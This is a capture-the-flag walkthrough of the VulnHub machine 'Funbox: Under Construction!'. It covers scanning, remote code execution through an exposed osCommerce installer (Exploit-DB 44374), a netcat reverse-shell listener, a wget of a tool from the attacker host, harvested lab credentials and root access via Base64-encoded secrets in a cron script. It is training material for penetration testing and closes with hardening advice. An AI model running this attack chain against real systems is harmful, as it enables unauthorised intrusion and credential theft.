# Funbox: Under Construction! (VulnHub)

## Overview

**Funbox: Under Construction!** is an Easy-level VulnHub machine created by **0815R2d2**. This machine focuses on web application enumeration, directory discovery, exploiting an exposed **osCommerce 2.3.4.1** installer for Remote Code Execution (RCE), credential harvesting, lateral movement, and Linux privilege escalation through cron job analysis.

The walkthrough demonstrates a complete penetration testing methodology, from reconnaissance to full root compromise, while highlighting common web application deployment mistakes and insecure credential management.

---

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Funbox: Under Construction! |
| Author | 0815R2d2 |
| Series | Funbox |
| Platform | VulnHub |
| Difficulty | Easy |
| Target OS | Ubuntu Linux |
| Attacker Machine | Kali Linux |
| Objective | Obtain User and Root Access |

---

## Skills Demonstrated

- Network Discovery
- Service Enumeration
- Web Enumeration
- Directory Bruteforcing
- Gobuster
- Nmap Scanning
- osCommerce Enumeration
- Vulnerability Assessment
- Exploit Research
- Remote Code Execution (RCE)
- Reverse Shell
- Credential Harvesting
- Linux Enumeration
- Shell Stabilization
- Process Monitoring
- Cron Job Analysis
- Base64 Decoding
- Privilege Escalation
- Root Compromise
- Post Exploitation

---

## Tools Used

- arp-scan
- Nmap
- Gobuster
- Python
- Netcat
- Exploit-DB
- pspy64
- Base64
- Linux Commands
- Kali Linux

---

## Attack Methodology

1. Discover the target machine.
2. Enumerate open services.
3. Perform web reconnaissance.
4. Discover hidden directories.
5. Identify vulnerable osCommerce installation.
6. Research the vulnerability.
7. Exploit the installer to gain Remote Code Execution.
8. Obtain a reverse shell.
9. Recover application credentials.
10. Switch to a valid local user.
11. Monitor cron jobs using pspy64.
12. Recover root credentials.
13. Gain root access.
14. Retrieve the root flag.

---

## Network Discovery

Identify the vulnerable host.

```bash
sudo arp-scan -l
```

Result:

```text
192.168.1.106
```

The target machine was successfully identified.

---

## Service Enumeration

Scan the target.

```bash
sudo nmap -A -sV -sC 192.168.1.106 --min-rate 10000
```

### Open Ports

| Port | Service | Version |
|------|----------|---------|
| 22 | SSH | OpenSSH 7.2p2 |
| 25 | SMTP | Postfix |
| 80 | HTTP | Apache 2.4.18 |
| 110 | POP3 | Dovecot |
| 143 | IMAP | Dovecot |

### Important Findings

- Apache web server
- HTTP title: Khronos 2.0 – Slides
- Hostname: funbox10
- Multiple mail services exposed

---

## Web Enumeration

Browse the web application.

```text
http://192.168.1.106
```

No obvious attack vectors were discovered, so directory enumeration was performed.

---

## Directory Enumeration

Run Gobuster.

```bash
sudo gobuster dir -u http://192.168.1.106 -x txt,php,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Interesting Directories

```text
/images
/catalog
/readme.txt
/styles.html
```

The **/catalog/** directory revealed an **osCommerce 2.3.4.1** installation.

---

## Vulnerability Research

Research the application version.

**Identified Vulnerability**

- osCommerce 2.3.4.1
- Exploit-DB 44374
- CVE-2018-25114
- Unauthenticated Remote Code Execution

The vulnerable installer allows arbitrary PHP code injection through the installation process.

---

## Preparing the Exploit

Download the exploit.

```bash
44374.py
```

Configure the target.

```python
base_url = "http://192.168.1.106/catalog/"
target_url = "http://192.168.1.106/catalog/install/install.php?step=4"
```

Insert a PHP reverse shell payload.

Start the listener.

```bash
nc -nvlp 1234
```

---

## Exploitation

Execute the exploit.

```bash
python3 44374.py
```

Open the generated URL.

```text
http://192.168.1.106/catalog/install/includes/configure.php
```

The payload executes and connects back to the attacker.

Reverse shell obtained as:

```text
www-data
```

---

## Post Exploitation

Inspect the backup configuration file.

```bash
cat configure.php.bak
```

Recovered credentials:

```text
Username : jack
Password : yellow
```

Upgrade the shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Switch user.

```bash
su jack
```

Successful access as:

```text
jack
```

---

## Privilege Escalation

Transfer pspy64.

```bash
wget http://<attacker-ip>/pspy64
chmod +x pspy64
```

Run process monitoring.

```bash
./pspy64
```

A recurring cron job executes:

```text
/usr/share/doc/examples/cron.sh
```

Inspect the script.

```bash
cat cron.sh
```

A Base64-encoded string is discovered.

Decode it.

```bash
echo "<base64_string>" | base64 -d
```

Recovered credentials:

```text
Username : root
Password : rfvbgt!!
```

Switch to root.

```bash
su root
```

Root shell obtained successfully.

---

## Root Flag

Navigate to the root directory.

```bash
cd /root
ls
cat root.txt
```

The machine is fully compromised.

---

## Vulnerabilities Identified

### 1. Exposed osCommerce Installer

The installation directory remained accessible after deployment.

### 2. osCommerce Remote Code Execution

The installer allowed arbitrary PHP code execution.

### 3. Sensitive Backup Files

`configure.php.bak` exposed valid system credentials.

### 4. Weak Credential Storage

Credentials were stored inside application configuration files.

### 5. Insecure Cron Configuration

A readable cron script contained encoded root credentials.

### 6. Weak Secrets Management

Base64 encoding was incorrectly used to hide sensitive information.

---

## Attack Chain Summary

- Host Discovery using arp-scan
- Service Enumeration with Nmap
- Web Enumeration
- Directory Bruteforcing using Gobuster
- osCommerce Version Identification
- Exploit Research
- RCE via Exploit-DB 44374
- Reverse Shell as www-data
- Credential Harvesting
- Lateral Movement to jack
- Process Monitoring using pspy64
- Cron Analysis
- Base64 Credential Recovery
- Root Access
- Root Flag Retrieval

---

## Security Recommendations

- Remove the `/install` directory immediately after installation.
- Upgrade osCommerce to a patched version.
- Disable unused installation files.
- Remove backup configuration files.
- Store credentials securely using secrets management.
- Restrict permissions on sensitive files.
- Avoid embedding credentials in scripts.
- Monitor cron jobs for suspicious behavior.
- Apply least privilege across services.
- Perform regular vulnerability assessments.

---

## Key Learning Outcomes

- Directory enumeration often reveals hidden attack surfaces.
- Exposed installation files can lead directly to RCE.
- Exploit-DB is valuable for identifying public exploits.
- Backup files frequently expose sensitive credentials.
- Shell stabilization improves post-exploitation activities.
- pspy64 is an excellent Linux privilege escalation enumeration tool.
- Cron jobs should always be inspected during privilege escalation.
- Base64 encoding is not encryption and should never be used for secret storage.

---

## Conclusion

Funbox: Under Construction! is an excellent beginner-friendly VulnHub machine that demonstrates a complete penetration testing workflow involving web enumeration, directory brute-forcing, Remote Code Execution through an exposed osCommerce installer, credential harvesting, lateral movement, Linux privilege escalation using pspy64, and full system compromise. It reinforces the importance of secure application deployment, credential protection, and proper system hardening.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
